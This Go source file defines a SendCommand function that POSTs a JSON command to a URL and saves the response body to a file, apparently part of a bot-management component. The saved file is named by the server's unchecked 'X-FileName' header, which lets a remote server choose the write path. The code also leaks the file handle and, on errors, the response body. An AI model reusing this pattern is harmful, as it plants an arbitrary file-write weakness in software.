package manager

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"os"
)

func SendCommand(cmd interface{}, url string) error {
	js, err := json.Marshal(cmd)

	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(js)))

	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		return err
	}

	if resp.Status != "200 OK" {
		return errors.New(resp.Status)
	}

	botfile, err := os.Create(resp.Header.Get("X-FileName"))

	if err != nil {
		return err
	}

	_, err = io.Copy(botfile, resp.Body)

	if err != nil {
		return err
	}

	defer resp.Body.Close()
	return nil
}
